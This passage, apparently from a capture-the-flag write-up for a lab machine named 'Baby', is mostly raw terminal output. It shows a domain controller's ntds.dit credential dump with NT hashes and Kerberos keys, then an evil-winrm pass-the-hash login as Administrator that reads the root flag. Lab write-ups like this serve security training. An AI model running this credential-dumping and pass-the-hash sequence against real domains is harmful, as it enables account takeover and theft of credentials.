Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 41d56bf9b458d01951f592ee4ba00ea6
[*] Reading and decrypting hashes from ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:ee4457ae59f1e3fbd764e33d9cef123d:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
BABYDC$:1000:aad3b435b51404eeaad3b435b51404ee:3d538eabff6633b62dbaa5fb5ade3b4d:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:6da4842e8c24b99ad21a92d620893884:::
baby.vl\Jacqueline.Barnett:1104:aad3b435b51404eeaad3b435b51404ee:20b8853f7aa61297bfbc5ed2ab34aed8:::
baby.vl\Ashley.Webb:1105:aad3b435b51404eeaad3b435b51404ee:02e8841e1a2c6c0fa1f0becac4161f89:::
baby.vl\Hugh.George:1106:aad3b435b51404eeaad3b435b51404ee:f0082574cc663783afdbc8f35b6da3a1:::
baby.vl\Leonard.Dyer:1107:aad3b435b51404eeaad3b435b51404ee:b3b2f9c6640566d13bf25ac448f560d2:::
baby.vl\Ian.Walker:1108:aad3b435b51404eeaad3b435b51404ee:0e440fd30bebc2c524eaaed6b17bcd5c:::
baby.vl\Connor.Wilkinson:1110:aad3b435b51404eeaad3b435b51404ee:e125345993f6258861fb184f1a8522c9:::
baby.vl\Joseph.Hughes:1112:aad3b435b51404eeaad3b435b51404ee:31f12d52063773769e2ea5723e78f17f:::
baby.vl\Kerry.Wilson:1113:aad3b435b51404eeaad3b435b51404ee:181154d0dbea8cc061731803e601d1e4:::
baby.vl\Teresa.Bell:1114:aad3b435b51404eeaad3b435b51404ee:7735283d187b758f45c0565e22dc20d8:::
baby.vl\Caroline.Robinson:1115:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::
[*] Kerberos keys from ntds.dit 
Administrator:aes256-cts-hmac-sha1-96:ad08cbabedff5acb70049bef721524a23375708cadefcb788704ba00926944f4
Administrator:aes128-cts-hmac-sha1-96:ac7aa518b36d5ea26de83c8d6aa6714d
Administrator:des-cbc-md5:d38cb994ae806b97
BABYDC$:aes256-cts-hmac-sha1-96:1a7d22edfaf3a8083f96a0270da971b4a42822181db117cf98c68c8f76bcf192
BABYDC$:aes128-cts-hmac-sha1-96:406b057cd3a92a9cc719f23b0821a45b
BABYDC$:des-cbc-md5:8fef68979223d645
krbtgt:aes256-cts-hmac-sha1-96:9c578fe1635da9e96eb60ad29e4e4ad90fdd471ea4dff40c0c4fce290a313d97
krbtgt:aes128-cts-hmac-sha1-96:1541c9f79887b4305064ddae9ba09e14
krbtgt:des-cbc-md5:d57383f1b3130de5
baby.vl\Jacqueline.Barnett:aes256-cts-hmac-sha1-96:851185add791f50bcdc027e0a0385eadaa68ac1ca127180a7183432f8260e084
baby.vl\Jacqueline.Barnett:aes128-cts-hmac-sha1-96:3abb8a49cf283f5b443acb239fd6f032
baby.vl\Jacqueline.Barnett:des-cbc-md5:01df1349548a206b
baby.vl\Ashley.Webb:aes256-cts-hmac-sha1-96:fc119502b9384a8aa6aff3ad659aa63bab9ebb37b87564303035357d10fa1039
baby.vl\Ashley.Webb:aes128-cts-hmac-sha1-96:81f5f99fd72fadd005a218b96bf17528
baby.vl\Ashley.Webb:des-cbc-md5:9267976186c1320e
baby.vl\Hugh.George:aes256-cts-hmac-sha1-96:0ea359386edf3512d71d3a3a2797a75db3168d8002a6929fd242eb7503f54258
baby.vl\Hugh.George:aes128-cts-hmac-sha1-96:50b966bdf7c919bfe8e85324424833dc
baby.vl\Hugh.George:des-cbc-md5:296bec86fd323b3e
baby.vl\Leonard.Dyer:aes256-cts-hmac-sha1-96:6d8fd945f9514fe7a8bbb11da8129a6e031fb504aa82ba1e053b6f51b70fdddd
baby.vl\Leonard.Dyer:aes128-cts-hmac-sha1-96:35fd9954c003efb73ded2fde9fc00d5a
baby.vl\Leonard.Dyer:des-cbc-md5:022313dce9a252c7
baby.vl\Ian.Walker:aes256-cts-hmac-sha1-96:54affe14ed4e79d9c2ba61713ef437c458f1f517794663543097ff1c2ae8a784
baby.vl\Ian.Walker:aes128-cts-hmac-sha1-96:78dbf35d77f29de5b7505ee88aef23df
baby.vl\Ian.Walker:des-cbc-md5:bcb094c2012f914c
baby.vl\Connor.Wilkinson:aes256-cts-hmac-sha1-96:55b0af76098dfe3731550e04baf1f7cb5b6da00de24c3f0908f4b2a2ea44475e
baby.vl\Connor.Wilkinson:aes128-cts-hmac-sha1-96:9d4af8203b2f9e3ecf64c1cbbcf8616b
baby.vl\Connor.Wilkinson:des-cbc-md5:fda762e362ab7ad3
baby.vl\Joseph.Hughes:aes256-cts-hmac-sha1-96:2e5f25b14f3439bfc901d37f6c9e4dba4b5aca8b7d944957651655477d440d41
baby.vl\Joseph.Hughes:aes128-cts-hmac-sha1-96:39fa92e8012f1b3f7be63c7ca9fd6723
baby.vl\Joseph.Hughes:des-cbc-md5:02f1cd9e52e0f245
baby.vl\Kerry.Wilson:aes256-cts-hmac-sha1-96:db5f7da80e369ee269cd5b0dbaea74bf7f7c4dfb3673039e9e119bd5518ea0fb
baby.vl\Kerry.Wilson:aes128-cts-hmac-sha1-96:aebbe6f21c76460feeebea188affbe01
baby.vl\Kerry.Wilson:des-cbc-md5:1f191c8c49ce07fe
baby.vl\Teresa.Bell:aes256-cts-hmac-sha1-96:8bb9cf1637d547b31993d9b0391aa9f771633c8f2ed8dd7a71f2ee5b5c58fc84
baby.vl\Teresa.Bell:aes128-cts-hmac-sha1-96:99bf021e937e1291cc0b6e4d01d96c66
baby.vl\Teresa.Bell:des-cbc-md5:4cbcdc3de6b50ee9
baby.vl\Caroline.Robinson:aes256-cts-hmac-sha1-96:1b5910434c3e2e9a549163c83669caa014087f2ead4319d4370e59c062346f85
baby.vl\Caroline.Robinson:aes128-cts-hmac-sha1-96:1271c52aeab036f30684ecf5ff42fdf2
baby.vl\Caroline.Robinson:des-cbc-md5:bc1cc4eca72cef75
[*] Cleaning up... 
                                                                                                                                                                                              
┌──(samurai㉿samurai)-[~/HTB/HTB-reports/Manual-WriteUps/Baby]
└─$ evil-winrm -i baby.vl -u Administrator -H ee4457ae59f1e3fbd764e33d9cef123d 
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..\Deskto[
Cannot find path '..\Deskto[' because it does not exist.
At line:1 char:1
+ cd ..\Deskto[
+ ~~~~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (..\Deskto[:String) [Set-Location], ItemNotFoundException
    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.SetLocationCommand
*Evil-WinRM* PS C:\Users\Administrator\Documents> type ..\Desktop\root.txt
0c4d104d3d031a4d958b278cb5263ebc
*Evil-WinRM* PS C:\Users\Administrator\Documents> 

```
